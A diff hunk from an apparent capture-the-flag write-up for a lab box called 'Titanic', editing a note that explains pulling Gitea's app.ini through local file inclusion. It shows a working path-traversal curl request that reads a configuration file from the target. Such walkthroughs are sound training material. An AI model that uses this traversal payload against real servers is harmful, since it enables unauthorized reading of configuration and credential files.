@@ -30,7 +30,7 @@ From the `docker-compose.yml` file we find out the path to the `gitea` directory
 
 Searching on the web we find that the default config files of `gitea` are stored in `config/app.ini`
 
-Pull out the default config via LFI
+Pull out the default config via LFI using [[curl]]
 
 ```sh
 curl --path-as-is 'http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini'
